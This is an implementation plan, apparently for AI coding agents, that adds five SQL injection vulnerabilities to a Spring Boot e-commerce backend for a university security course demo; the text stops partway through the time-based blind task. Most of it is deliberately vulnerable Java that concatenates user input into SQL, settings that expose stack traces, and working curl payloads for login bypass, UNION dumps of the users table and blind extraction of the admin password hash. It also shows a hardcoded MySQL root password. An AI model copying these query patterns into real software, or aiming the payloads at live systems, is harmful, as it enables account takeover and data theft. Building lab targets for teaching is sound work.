# SQLi Demo Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Cài 5 lỗ hổng SQL Injection vào HPB-Shop-BE để demo BTL môn ATBM, mỗi lỗ hổng tại 1 endpoint riêng, hỗ trợ cả demo bằng tay lẫn `sqlmap`.

**Architecture:** Bypass JPA bằng cách inject `JdbcTemplate` (Spring built-in) vào tầng Service và build SQL nối chuỗi. Mọi raw SELECT alias cột DB sang camelCase để JSON khớp với hợp đồng FE — UI không gãy. Mỗi lỗ hổng commit riêng trên branch `feat/sqli-demo`.

**Tech Stack:** Spring Boot 4.0.3, Spring JDBC (JdbcTemplate), MySQL 8.4, JPA/Hibernate (giữ nguyên cho phần không inject lỗ hổng).

**Spec gốc:** [`docs/superpowers/specs/2026-04-29-sqli-demo-design.md`](../specs/2026-04-29-sqli-demo-design.md)

---

## File Structure

### Modified files (trong repo `HPB-Shop-BE`, branch `feat/sqli-demo`)

| File | Trách nhiệm |
|------|-------------|
| `src/main/resources/application.properties` | Expose stack trace cho Error-based |
| `src/main/java/com/example/web_project/service/UserService.java` | Inject `JdbcTemplate`, thay `login()` bằng raw SQL (Auth Bypass) |
| `src/main/java/com/example/web_project/service/ProductService.java` | Inject `JdbcTemplate`, thay `searchProducts()`, `getProductById()`, `getFilteredProducts()` bằng raw SQL |
| `src/main/java/com/example/web_project/service/OrderService.java` | Inject `JdbcTemplate`, thêm `getMyOrdersRaw()` |
| `src/main/java/com/example/web_project/controller/PublicProductController.java` | Đổi return type của `search()`, `getProductDetail()` sang `List<Map<String,Object>>`; đổi `@PathVariable Integer id` → `String id` |
| `src/main/java/com/example/web_project/controller/customer/CustomerOrderController.java` | Đổi `@PathVariable Integer userId` → `String userId` cho `getMyOrders()` |

### Created files

| File | Mục đích |
|------|----------|
| `HPB-Shop-BE/web_project/scripts/seed-demo-users.sh` | Bash script seed thêm 4 user (re-run được) |
| `docs/DEMO-SQLI-PAYLOADS.md` (repo root) | Cheat sheet payload + lệnh sqlmap để dùng khi demo |

### Files NOT touched
- Frontend (`HPB-Shop/`) — không sửa file nào
- `Repository`, `Entity` (Spring Data JPA) — giữ nguyên
- `SecurityConfig` — đã verify, không cần đổi

---

## Tổng quan các Task

| Task | Mục tiêu | Estimate |
|------|----------|----------|
| 0 | Pre-flight: commit baseline, verify env | 5 min |
| 1 | Seed thêm 4 user | 10 min |
| 2 | Cập nhật `application.properties` (expose error) | 3 min |
| 3 | Lỗ hổng 1 — Auth Bypass | 25 min |
| 4 | Lỗ hổng 2 — UNION-based | 25 min |
| 5 | Lỗ hổng 3 — Error-based | 20 min |
| 6 | Lỗ hổng 4 — Boolean Blind | 15 min |
| 7 | Lỗ hổng 5 — Time-based Blind | 20 min |
| 8 | Tạo `DEMO-SQLI-PAYLOADS.md` cheat sheet | 20 min |
| 9 | End-to-end smoke test trên cả 5 lỗ hổng | 15 min |

**Tổng:** ~2.5 giờ.

---

## Task 0: Pre-flight Setup

**Files:**
- Modify: `HPB-Shop-BE/web_project/src/main/resources/application.properties` (đã có change)

- [ ] **Step 1: Verify đang ở branch `feat/sqli-demo`**

```bash
cd /Users/justminh/Desktop/DH/BTL_ATBM/HPB-Shop-BE
git branch --show-current
```
Expected: `feat/sqli-demo`

- [ ] **Step 2: Commit `application.properties` baseline change (đổi password DB)**

```bash
cd /Users/justminh/Desktop/DH/BTL_ATBM/HPB-Shop-BE
git status
git add web_project/src/main/resources/application.properties
git commit -m "config: cập nhật MySQL password cho local dev"
```
Expected: commit thành công, working tree clean.

- [ ] **Step 3: Verify backend đang chạy & DB có dữ liệu cơ bản**

```bash
curl -s http://localhost:8080/api/products | python3 -c "import json,sys; print(len(json.load(sys.stdin)),'products')"
```
Expected: `12 products`. Nếu BE không chạy, khởi động lại:
```bash
export JAVA_HOME=/Library/Java/JavaVirtualMachines/jdk-25.jdk/Contents/Home
export PATH=$JAVA_HOME/bin:$PATH
cd /Users/justminh/Desktop/DH/BTL_ATBM/HPB-Shop-BE/web_project
nohup mvn -DskipTests spring-boot:run > /tmp/hpb-backend.log 2>&1 &
sleep 15  # chờ khởi động
curl -s http://localhost:8080/api/products | head -c 50
```

- [ ] **Step 4: Verify đăng nhập admin hiện tại hoạt động (an toàn — chưa cài lỗ hổng)**

```bash
curl -s -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"loginId":"admin","password":"admin123"}' | head -c 100
```
Expected: JSON chứa `"role":"admin"` và `"token":"eyJ..."`.

---

## Task 1: Seed thêm 4 user

**Files:**
- Create: `HPB-Shop-BE/web_project/scripts/seed-demo-users.sh`

- [ ] **Step 1: Tạo thư mục scripts**

```bash
mkdir -p /Users/justminh/Desktop/DH/BTL_ATBM/HPB-Shop-BE/web_project/scripts
```

- [ ] **Step 2: Tạo file `seed-demo-users.sh`**

File: `HPB-Shop-BE/web_project/scripts/seed-demo-users.sh`

```bash
#!/usr/bin/env bash
# Seed thêm user cho demo SQLi. Idempotent — chạy lại không bị duplicate.
# Yêu cầu: backend chạy ở localhost:8080, MySQL chạy ở localhost:3306.

set -e
API="http://localhost:8080/api/auth/register"
MYSQL_PWD=minhkhuat123

echo "=== Đăng ký 4 user mới qua API (BCrypt hash) ==="
curl -s -X POST "$API" -H "Content-Type: application/json" \
  -d '{"username":"manager","fullname":"Quan Ly Kho","email":"manager@hpb.com","password":"manager123","phone":"0900000003","gender":"male"}' \
  | head -c 200; echo
curl -s -X POST "$API" -H "Content-Type: application/json" \
  -d '{"username":"staff01","fullname":"Nhan Vien 01","email":"staff01@hpb.com","password":"staff123","phone":"0900000004","gender":"male"}' \
  | head -c 200; echo
curl -s -X POST "$API" -H "Content-Type: application/json" \
  -d '{"username":"vipuser","fullname":"VIP Customer","email":"vip@hpb.com","password":"vippass","phone":"0900000005","gender":"female"}' \
  | head -c 200; echo
curl -s -X POST "$API" -H "Content-Type: application/json" \
  -d '{"username":"locked01","fullname":"Locked Acc","email":"locked@hpb.com","password":"abc123","phone":"0900000006","gender":"male"}' \
  | head -c 200; echo

echo ""
echo "=== Cập nhật role/status sau khi đăng ký ==="
/usr/local/mysql/bin/mysql -u root -p"$MYSQL_PWD" HPBSports_DB <<SQL
UPDATE users SET role='admin' WHERE username='manager';
UPDATE users SET status='locked' WHERE username='locked01';
SELECT user_id, username, role, status FROM users ORDER BY user_id;
SQL
```

- [ ] **Step 3: Chmod + chạy script**

```bash
chmod +x /Users/justminh/Desktop/DH/BTL_ATBM/HPB-Shop-BE/web_project/scripts/seed-demo-users.sh
/Users/justminh/Desktop/DH/BTL_ATBM/HPB-Shop-BE/web_project/scripts/seed-demo-users.sh
```
Expected output: 4 dòng JSON user mới + bảng SELECT có 6 user (admin, customer1, manager, staff01, vipuser, locked01) với role/status đúng.

- [ ] **Step 4: Verify**

```bash
curl -s http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"loginId":"manager","password":"manager123"}' | python3 -c "import json,sys; d=json.load(sys.stdin); print('manager role:', d['user']['role'])"
```
Expected: `manager role: admin`

- [ ] **Step 5: Commit**

```bash
cd /Users/justminh/Desktop/DH/BTL_ATBM/HPB-Shop-BE
git add web_project/scripts/seed-demo-users.sh
git commit -m "chore: thêm script seed 4 user demo (manager, staff01, vipuser, locked01)"
```

---

## Task 2: Cập nhật `application.properties` (expose stack trace)

**Files:**
- Modify: `HPB-Shop-BE/web_project/src/main/resources/application.properties`

- [ ] **Step 1: Thêm config vào cuối file**

File: `HPB-Shop-BE/web_project/src/main/resources/application.properties`

Thêm vào cuối file (sau dòng `springdoc.openapi.info.description=...`):

```properties

# === SQLi Demo Config: expose stack trace cho Error-based ===
server.error.include-message=always
server.error.include-stacktrace=always
server.error.include-binding-errors=always
spring.mvc.problemdetails.enabled=false
```

- [ ] **Step 2: Restart backend để config có hiệu lực**

```bash
# Tìm và kill process backend cũ
lsof -ti:8080 | xargs kill -9 2>/dev/null || true
sleep 2
# Khởi động lại
export JAVA_HOME=/Library/Java/JavaVirtualMachines/jdk-25.jdk/Contents/Home
export PATH=$JAVA_HOME/bin:$PATH
cd /Users/justminh/Desktop/DH/BTL_ATBM/HPB-Shop-BE/web_project
nohup mvn -DskipTests spring-boot:run > /tmp/hpb-backend.log 2>&1 &
# Chờ backend start (tối đa 30s)
for i in $(seq 1 30); do
  curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/api/products | grep -q 200 && break
  sleep 1
done
curl -s -o /dev/null -w "Backend: %{http_code}\n" http://localhost:8080/api/products
```
Expected: `Backend: 200`

- [ ] **Step 3: Verify config bằng cách trigger 1 lỗi 404**

```bash
curl -s http://localhost:8080/api/notexist | python3 -m json.tool | head -10
```
Expected: JSON response chứa `"message"` field với mô tả lỗi (không chỉ status code rỗng).

- [ ] **Step 4: Commit**

```bash
cd /Users/justminh/Desktop/DH/BTL_ATBM/HPB-Shop-BE
git add web_project/src/main/resources/application.properties
git commit -m "config: expose error stack trace cho Error-based SQLi demo"
```

---

## Task 3: Lỗ hổng 1 — Auth Bypass

**Files:**
- Modify: `HPB-Shop-BE/web_project/src/main/java/com/example/web_project/service/UserService.java`

- [ ] **Step 1: Viết verification curl — lỗ hổng CHƯA tồn tại, payload sẽ FAIL**

```bash
curl -s -o /dev/null -w "Bypass attempt: %{http_code}\n" \
  -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d "{\"loginId\":\"admin' --\",\"password\":\"anything\"}"
```
Expected: `Bypass attempt: 401` (vì code hiện tại dùng JPA an toàn).

- [ ] **Step 2: Sửa UserService.java — inject JdbcTemplate + viết lại login()**

File: `HPB-Shop-BE/web_project/src/main/java/com/example/web_project/service/UserService.java`

Tại vị trí imports (sau dòng `import org.springframework.stereotype.Service;`), thêm:
```java
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.jdbc.core.RowMapper;
```

Tại vị trí khai báo field (sau `@Autowired private PasswordEncoder passwordEncoder;`), thêm:
```java
    @Autowired
    private JdbcTemplate jdbcTemplate;

    private final RowMapper<User> userRowMapper = (rs, rowNum) -> {
        User u = new User();
        u.setUserId(rs.getInt("user_id"));
        u.setUsername(rs.getString("username"));
        u.setFullname(rs.getString("fullname"));
        u.setEmail(rs.getString("email"));
        u.setPassword(rs.getString("password"));
        u.setPhone(rs.getString("phone"));
        u.setRole(rs.getString("role"));
        u.setStatus(rs.getString("status"));
        u.setGender(rs.getString("gender"));
        java.sql.Timestamp ts = rs.getTimestamp("created_at");
        if (ts != null) u.setCreatedAt(ts.toLocalDateTime());
        return u;
    };
```

Thay thế method `login()` (hiện tại từ dòng 40 đến 48) bằng:
```java
    // [VULN] Auth Bypass — raw SQL nối chuỗi, không escape
    public User login(String identifier, String password) {
        String sql = "SELECT * FROM users WHERE username='" + identifier
                   + "' AND password='" + password + "'";
        try {
            List<User> users = jdbcTemplate.query(sql, userRowMapper);
            return users.isEmpty() ? null : users.get(0);
        } catch (Exception e) {
            return null;
        }
    }
```

- [ ] **Step 3: Restart backend**

```bash
lsof -ti:8080 | xargs kill -9 2>/dev/null || true
sleep 2
export JAVA_HOME=/Library/Java/JavaVirtualMachines/jdk-25.jdk/Contents/Home
export PATH=$JAVA_HOME/bin:$PATH
cd /Users/justminh/Desktop/DH/BTL_ATBM/HPB-Shop-BE/web_project
nohup mvn -DskipTests spring-boot:run > /tmp/hpb-backend.log 2>&1 &
for i in $(seq 1 30); do
  curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/api/products | grep -q 200 && break
  sleep 1
done
echo "Backend ready"
```

- [ ] **Step 4: Verify lỗ hổng — payload bypass phải thành công 200**

```bash
echo "=== Auth Bypass với username 'admin' --' ==="
curl -s -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d "{\"loginId\":\"admin' --\",\"password\":\"anything\"}" | python3 -m json.tool | head -15
```
Expected: JSON chứa `"role": "admin"` và `"token": "eyJ..."` → bypass thành công.

```bash
echo "=== Auth Bypass với 'OR role=admin' ==="
curl -s -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d "{\"loginId\":\"' OR role='admin' --\",\"password\":\"x\"}" | python3 -c "import json,sys; d=json.load(sys.stdin); print('user:', d['user']['username'],'| role:', d['user']['role'])"
```
Expected: `user: admin | role: admin` (lấy admin đầu tiên trong bảng).

- [ ] **Step 5: Smoke test — login bình thường vẫn hoạt động**

```bash
curl -s -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"loginId":"customer1","password":"123456"}' | python3 -c "import json,sys; d=json.load(sys.stdin); print('Normal login OK, role:', d['user']['role'])"
```
Expected: `Normal login OK, role: customer`

- [ ] **Step 6: Smoke test FE — mở browser thử login**

Mở http://localhost:5500/Dang-nhap.html, login với `admin` / `admin123` → vào được trang chủ. Đăng xuất, login với `admin' --` / `bất kỳ` → vào được Admin Dashboard.

- [ ] **Step 7: Commit**

```bash
cd /Users/justminh/Desktop/DH/BTL_ATBM/HPB-Shop-BE
git add web_project/src/main/java/com/example/web_project/service/UserService.java
git commit -m "feat(vuln): cài Auth Bypass SQLi trong UserService.login() (raw SQL)"
```

---

## Task 4: Lỗ hổng 2 — UNION-based

**Files:**
- Modify: `HPB-Shop-BE/web_project/src/main/java/com/example/web_project/service/ProductService.java`
- Modify: `HPB-Shop-BE/web_project/src/main/java/com/example/web_project/controller/PublicProductController.java`

- [ ] **Step 1: Verify chưa có lỗ hổng — payload UNION sẽ trả empty/error**

```bash
curl -s "http://localhost:8080/api/products/search?keyword=%25%27%20UNION%20SELECT%20user_id%2Cusername%2Cemail%2C0%2Cpassword%2Crole%20FROM%20users--" | head -c 100
```
Expected: `[]` (empty array) — JPA escape ký tự nên không thực thi UNION.

- [ ] **Step 2: Sửa ProductService.java — inject JdbcTemplate + thay searchProducts**

File: `HPB-Shop-BE/web_project/src/main/java/com/example/web_project/service/ProductService.java`

Thêm imports (sau `import com.example.web_project.repository.ProductRepository;`):
```java
import java.util.Map;
import org.springframework.jdbc.core.JdbcTemplate;
```

Thêm field (sau `@Autowired private ProductRepository productRepository;`):
```java
    @Autowired
    private JdbcTemplate jdbcTemplate;
```

Thay thế method `searchProducts(String keyword)` (hiện tại dòng 31–33) bằng:
```java
    // [VULN] UNION-based SQLi — raw SQL nối chuỗi vào LIKE
    public List<Map<String, Object>> searchProducts(String keyword) {
        String sql = "SELECT product_id AS productId, name, brand, price, "
                   + "image_url AS imageUrl, description, stock, sku "
                   + "FROM products WHERE name LIKE '%" + keyword + "%'";
        return jdbcTemplate.queryForList(sql);
    }
```

- [ ] **Step 3: Sửa PublicProductController.java — đổi return type của search()**

File: `HPB-Shop-BE/web_project/src/main/java/com/example/web_project/controller/PublicProductController.java`

Thêm import (sau `import java.util.List;`):
```java
import java.util.Map;
```

Thay thế method `search()` (hiện tại dòng 30–34) bằng:
```java
    @Operation(summary = "Tìm kiếm vợt theo tên hoặc hãng [VULN: UNION-based]")
    @GetMapping("/search")
    public List<Map<String, Object>> search(@RequestParam String keyword) {
        return productService.searchProducts(keyword);
    }
```

- [ ] **Step 4: Restart backend**

```bash
lsof -ti:8080 | xargs kill -9 2>/dev/null || true
sleep 2
export JAVA_HOME=/Library/Java/JavaVirtualMachines/jdk-25.jdk/Contents/Home
export PATH=$JAVA_HOME/bin:$PATH
cd /Users/justminh/Desktop/DH/BTL_ATBM/HPB-Shop-BE/web_project
nohup mvn -DskipTests spring-boot:run > /tmp/hpb-backend.log 2>&1 &
for i in $(seq 1 30); do
  curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/api/products | grep -q 200 && break
  sleep 1
done
echo "Backend ready"
```

- [ ] **Step 5: Verify lỗ hổng — UNION dump bảng users**

```bash
echo "=== UNION-based dump users ==="
curl -s "http://localhost:8080/api/products/search?keyword=%25%27%20UNION%20SELECT%20user_id%2Cusername%2Cemail%2C0%2Cpassword%2Crole%2C0%2C%27hack%27%20FROM%20users--" | python3 -m json.tool | head -40
```
Expected: JSON array có cả 12 sản phẩm + 6 user (mỗi user có `name=username`, `brand=email`, `imageUrl=BCrypt hash`, `description=role`).

- [ ] **Step 6: Smoke test — search bình thường vẫn trả sản phẩm đúng**

```bash
curl -s "http://localhost:8080/api/products/search?keyword=Yonex" | python3 -c "import json,sys; d=json.load(sys.stdin); print(f'{len(d)} kết quả Yonex'); print('First:', d[0]['name'])"
```
Expected: ≥3 kết quả Yonex, sản phẩm đầu tiên là "Yonex Astrox 99 Pro" hoặc tương tự.

- [ ] **Step 7: Smoke test FE — Trang chủ ô tìm kiếm**

Mở http://localhost:5500/Trang-chu.html, gõ `Yonex` vào ô search → hiện sản phẩm Yonex bình thường. Gõ payload UNION → hiện danh sách user dưới dạng "sản phẩm" (tên = username, mô tả = role).

- [ ] **Step 8: Commit**

```bash
cd /Users/justminh/Desktop/DH/BTL_ATBM/HPB-Shop-BE
git add web_project/src/main/java/com/example/web_project/service/ProductService.java \
        web_project/src/main/java/com/example/web_project/controller/PublicProductController.java
git commit -m "feat(vuln): cài UNION-based SQLi trong /api/products/search (raw SQL)"
```

---

## Task 5: Lỗ hổng 3 — Error-based

**Files:**
- Modify: `HPB-Shop-BE/web_project/src/main/java/com/example/web_project/service/ProductService.java`
- Modify: `HPB-Shop-BE/web_project/src/main/java/com/example/web_project/controller/PublicProductController.java`

- [ ] **Step 1: Verify chưa có lỗ hổng — payload error-based bị reject**

```bash
curl -s -o /dev/null -w "%{http_code}\n" "http://localhost:8080/api/products/1%20AND%20extractvalue(1,concat(0x7e,version()))"
```
Expected: `400` (Spring không parse được Integer).

- [ ] **Step 2: Sửa ProductService.java — thay getProductById bằng raw SQL có expose error**

File: `HPB-Shop-BE/web_project/src/main/java/com/example/web_project/service/ProductService.java`

Thêm import (cùng vị trí imports vừa thêm):
```java
import org.springframework.dao.DataAccessException;
```

Thay thế method `getProductById()` (hiện tại dòng 27–29) bằng:
```java
    // [VULN] Error-based SQLi — raw SQL + expose MySQL error message
    public List<Map<String, Object>> getProductById(String id) {
        String sql = "SELECT product_id AS productId, name, brand, price, "
                   + "image_url AS imageUrl, description, stock, sku "
                   + "FROM products WHERE product_id=" + id;
        try {
            return jdbcTemplate.queryForList(sql);
        } catch (DataAccessException e) {
            // Cố ý expose MySQL error chi tiết để Error-based SQLi hoạt động
            throw new RuntimeException(e.getMostSpecificCause().getMessage());
        }
    }
```

- [ ] **Step 3: Sửa PublicProductController.java — đổi @PathVariable Integer id → String id và return type**

File: `HPB-Shop-BE/web_project/src/main/java/com/example/web_project/controller/PublicProductController.java`

Thay thế method `getProductDetail()` (hiện tại dòng 54–62) bằng:
```java
    @Operation(summary = "Lấy chi tiết sản phẩm theo ID [VULN: Error-based]")
    @GetMapping("/{id}")
    public ResponseEntity<?> getProductDetail(@PathVariable String id) {
        List<Map<String, Object>> result = productService.getProductById(id);
        if (result.isEmpty()) {
            return ResponseEntity.notFound().build();
        }
        return ResponseEntity.ok(result.get(0));
    }
```

- [ ] **Step 4: Restart backend**

```bash
lsof -ti:8080 | xargs kill -9 2>/dev/null || true
sleep 2
export JAVA_HOME=/Library/Java/JavaVirtualMachines/jdk-25.jdk/Contents/Home
export PATH=$JAVA_HOME/bin:$PATH
cd /Users/justminh/Desktop/DH/BTL_ATBM/HPB-Shop-BE/web_project
nohup mvn -DskipTests spring-boot:run > /tmp/hpb-backend.log 2>&1 &
for i in $(seq 1 30); do
  curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/api/products | grep -q 200 && break
  sleep 1
done
echo "Backend ready"
```

- [ ] **Step 5: Verify lỗ hổng — error message leak DB version**

```bash
echo "=== Error-based — leak version ==="
curl -s "http://localhost:8080/api/products/1%20AND%20extractvalue(1,concat(0x7e,(SELECT%20version())))" | python3 -m json.tool
```
Expected: JSON response 500 chứa `"message"` với chuỗi như `XPATH syntax error: '~8.4.7'` hoặc tương tự.

```bash
echo "=== Error-based — leak admin password hash ==="
curl -s "http://localhost:8080/api/products/1%20AND%20extractvalue(1,concat(0x7e,(SELECT%20password%20FROM%20users%20WHERE%20username='admin')))" | python3 -m json.tool
```
Expected: response 500 với `"message"` chứa `XPATH syntax error: '~$2a$10$...'` (đầu hash BCrypt).

- [ ] **Step 6: Smoke test — request bình thường vẫn trả sản phẩm**

```bash
curl -s http://localhost:8080/api/products/1 | python3 -c "import json,sys; d=json.load(sys.stdin); print('Product:', d['name'])"
```
Expected: `Product: Yonex Astrox 99 Pro`

- [ ] **Step 7: Smoke test FE — Trang chi tiết sản phẩm**

Mở http://localhost:5500/Trang-chu.html, click 1 sản phẩm → trang chi tiết hiển thị bình thường (không gãy).

- [ ] **Step 8: Commit**

```bash
cd /Users/justminh/Desktop/DH/BTL_ATBM/HPB-Shop-BE
git add web_project/src/main/java/com/example/web_project/service/ProductService.java \
        web_project/src/main/java/com/example/web_project/controller/PublicProductController.java
git commit -m "feat(vuln): cài Error-based SQLi trong /api/products/{id} (expose MySQL error)"
```

---

## Task 6: Lỗ hổng 4 — Boolean Blind

**Files:**
- Modify: `HPB-Shop-BE/web_project/src/main/java/com/example/web_project/service/ProductService.java`

- [ ] **Step 1: Verify chưa có lỗ hổng — payload Blind không thực thi**

```bash
curl -s "http://localhost:8080/api/products/filter?brand=Yonex%27%20AND%201%3D1--" | python3 -c "import json,sys; print(len(json.load(sys.stdin)),'kết quả')"
```
Expected: `0 kết quả` (JPA escape, brand `Yonex' AND 1=1--` không khớp gì).

- [ ] **Step 2: Sửa ProductService.java — thay getFilteredProducts bằng raw SQL**

File: `HPB-Shop-BE/web_project/src/main/java/com/example/web_project/service/ProductService.java`

Thay thế method `getFilteredProducts()` (hiện tại dòng 48–58) bằng:
```java
    // [VULN] Boolean Blind SQLi — raw SQL với brand nối chuỗi vào WHERE
    public List<Map<String, Object>> getFilteredProducts(String brand, BigDecimal minPrice, BigDecimal maxPrice, String sortType) {
        StringBuilder sql = new StringBuilder(
            "SELECT product_id AS productId, name, brand, price, "
          + "image_url AS imageUrl, description, stock, sku FROM products WHERE 1=1");
        if (brand != null && !brand.isBlank()) {
            sql.append(" AND brand='").append(brand).append("'"); // ← injection point
        }
        if (minPrice != null) sql.append(" AND price >= ").append(minPrice);
        if (maxPrice != null) sql.append(" AND price <= ").append(maxPrice);
        if ("priceAsc".equals(sortType))      sql.append(" ORDER BY price ASC");
        else if ("priceDesc".equals(sortType)) sql.append(" ORDER BY price DESC");
        else                                    sql.append(" ORDER BY product_id DESC");
        return jdbcTemplate.queryForList(sql.toString());
    }
```

- [ ] **Step 3: Sửa PublicProductController — đổi return type của filterProducts**

File: `HPB-Shop-BE/web_project/src/main/java/com/example/web_project/controller/PublicProductController.java`

Thay thế method `filterProducts()` (hiện tại dòng 64–74) bằng:
```java
    @Operation(summary = "Lọc sản phẩm nâng cao [VULN: Boolean Blind]")
    @GetMapping("/filter")
    public ResponseEntity<List<Map<String, Object>>> filterProducts(
            @RequestParam(required = false) String brand,
            @RequestParam(required = false) BigDecimal minPrice,
            @RequestParam(required = false) BigDecimal maxPrice,
            @RequestParam(defaultValue = "default") String sort) {
        List<Map<String, Object>> results = productService.getFilteredProducts(brand, minPrice, maxPrice, sort);
        return ResponseEntity.ok(results);
    }
```

- [ ] **Step 4: Restart backend**

```bash
lsof -ti:8080 | xargs kill -9 2>/dev/null || true
sleep 2
export JAVA_HOME=/Library/Java/JavaVirtualMachines/jdk-25.jdk/Contents/Home
export PATH=$JAVA_HOME/bin:$PATH
cd /Users/justminh/Desktop/DH/BTL_ATBM/HPB-Shop-BE/web_project
nohup mvn -DskipTests spring-boot:run > /tmp/hpb-backend.log 2>&1 &
for i in $(seq 1 30); do
  curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/api/products | grep -q 200 && break
  sleep 1
done
echo "Backend ready"
```

- [ ] **Step 5: Verify lỗ hổng — Boolean Blind TRUE/FALSE**

```bash
echo "=== TRUE branch: 1=1 ==="
curl -s "http://localhost:8080/api/products/filter?brand=Yonex%27%20AND%201%3D1--" | python3 -c "import json,sys; print(len(json.load(sys.stdin)),'sản phẩm Yonex')"

echo "=== FALSE branch: 1=2 ==="
curl -s "http://localhost:8080/api/products/filter?brand=Yonex%27%20AND%201%3D2--" | python3 -c "import json,sys; print(len(json.load(sys.stdin)),'sản phẩm')"

echo "=== Đoán ký tự đầu của BCrypt hash của admin (kỳ vọng = '\$') ==="
curl -s "http://localhost:8080/api/products/filter?brand=Yonex%27%20AND%20SUBSTRING((SELECT%20password%20FROM%20users%20WHERE%20username%3D%27admin%27),1,1)%3D%27%24%27--" | python3 -c "import json,sys; print(len(json.load(sys.stdin)),'sản phẩm — TRUE = đúng ký tự')"
```
Expected:
- TRUE branch: 4 sản phẩm Yonex
- FALSE branch: 0 sản phẩm
- Đoán ký tự `$`: 4 sản phẩm (vì BCrypt luôn bắt đầu bằng `$`)

- [ ] **Step 6: Smoke test — filter bình thường vẫn hoạt động**

```bash
curl -s "http://localhost:8080/api/products/filter?brand=Yonex" | python3 -c "import json,sys; d=json.load(sys.stdin); print(f'{len(d)} Yonex products'); print('Sample:', d[0]['name'])"
```
Expected: 4 sản phẩm Yonex.

- [ ] **Step 7: Smoke test FE**

Mở http://localhost:5500/San-pham-theo-hang.html?brand=Yonex → hiện 4 sản phẩm Yonex bình thường.

- [ ] **Step 8: Commit**

```bash
cd /Users/justminh/Desktop/DH/BTL_ATBM/HPB-Shop-BE
git add web_project/src/main/java/com/example/web_project/service/ProductService.java \
        web_project/src/main/java/com/example/web_project/controller/PublicProductController.java
git commit -m "feat(vuln): cài Boolean Blind SQLi trong /api/products/filter (raw SQL brand)"
```

---

## Task 7: Lỗ hổng 5 — Time-based Blind

**Files:**
- Modify: `HPB-Shop-BE/web_project/src/main/java/com/example/web_project/service/OrderService.java`
- Modify: `HPB-Shop-BE/web_project/src/main/java/com/example/web_project/controller/customer/CustomerOrderController.java`

- [ ] **Step 1: Lấy JWT của customer1 cho test**

```bash
TOKEN=$(curl -s -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"loginId":"customer1","password":"123456"}' \
  | python3 -c "import json,sys; print(json.load(sys.stdin)['token'])")
echo "Token: ${TOKEN:0:30}..."
```
Expected: token in dạng `eyJhbGciOiJIUzI1NiJ9.eyJzdW...`

- [ ] **Step 2: Verify chưa có lỗ hổng — payload time-based gây 400**

```bash
time curl -s -o /dev/null -w "%{http_code}\n" \
  -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8080/api/customer/orders/my-orders/2%20AND%20SLEEP(2)"
```
Expected: status `400`, thời gian < 1s (Spring không parse được Integer "2 AND SLEEP(2)").

- [ ] **Step 3: Sửa OrderService.java — thêm import + thêm method getMyOrdersRaw**

File: `HPB-Shop-BE/web_project/src/main/java/com/example/web_project/service/OrderService.java`

Thêm imports (sau các import hiện có):
```java
import org.springframework.jdbc.core.JdbcTemplate;
```

Thêm field (sau `@Autowired private CartService cartService;`):
```java
    @Autowired
    private JdbcTemplate jdbcTemplate;
```

Thay thế method `getMyOrders(Integer userId, ...)` (dòng 167–175) bằng version nhận `String`:
```java
    // [VULN] Time-based Blind SQLi — raw SQL với userId nối chuỗi vào WHERE
    public List<Map<String, Object>> getMyOrders(String userId, String status, String keyword) {
        StringBuilder sql = new StringBuilder(
            "SELECT order_id AS orderId, user_id AS userId, total_price AS totalPrice, "
          + "status, shipping_address AS shippingAddress, phone, payment_method AS paymentMethod, "
          + "shipping_fee AS shippingFee, created_at AS createdAt "
          + "FROM orders WHERE user_id=").append(userId); // ← injection point
        if (status != null && !status.equalsIgnoreCase("all") && !status.isBlank()) {
            sql.append(" AND status='").append(status).append("'");
        }
        sql.append(" ORDER BY created_at DESC");
        return jdbcTemplate.queryForList(sql.toString());
    }
```

⚠️ **Note:** Method gốc trả `List<Order>` và có nhánh `searchMyOrders(userId, keyword)`. Phương án thay thế đơn giản hóa — bỏ nhánh keyword search vì không cần cho demo time-based. Nếu FE Don-mua.html dùng search keyword sẽ hiển thị toàn bộ đơn (không lọc) — chấp nhận được cho scope demo.

- [ ] **Step 4: Sửa CustomerOrderController.java — đổi @PathVariable Integer userId → String userId**

File: `HPB-Shop-BE/web_project/src/main/java/com/example/web_project/controller/customer/CustomerOrderController.java`

Không cần thêm import mới (`java.util.List` và `java.util.Map` đã có sẵn ở dòng 3-4).

Thay thế method `getMyOrders()` (hiện tại dòng 75–82) bằng:
```java
    @Operation(summary = "Lấy danh sách đơn mua [VULN: Time-based Blind]")
    @GetMapping("/my-orders/{userId}")
    public List<Map<String, Object>> getMyOrders(
            @PathVariable String userId,
            @RequestParam(required = false) String status,
            @RequestParam(required = false) String keyword) {
        return orderService.getMyOrders(userId, status, keyword);
    }
```

- [ ] **Step 5: Restart backend**

```bash
lsof -ti:8080 | xargs kill -9 2>/dev/null || true
sleep 2
export JAVA_HOME=/Library/Java/JavaVirtualMachines/jdk-25.jdk/Contents/Home
export PATH=$JAVA_HOME/bin:$PATH
cd /Users/justminh/Desktop/DH/BTL_ATBM/HPB-Shop-BE/web_project
nohup mvn -DskipTests spring-boot:run > /tmp/hpb-backend.log 2>&1 &
for i in $(seq 1 30); do
  curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/api/products | grep -q 200 && break
  sleep 1
done
echo "Backend ready"
```

- [ ] **Step 6: Verify lỗ hổng — SLEEP(3) làm response delay**

```bash
TOKEN=$(curl -s -X POST http://localhost:8080/api/auth/login -H "Content-Type: application/json" -d '{"loginId":"customer1","password":"123456"}' | python3 -c "import json,sys; print(json.load(sys.stdin)['token'])")

echo "=== Test 1: ký tự đầu password admin = '\$' (TRUE → delay 3s) ==="
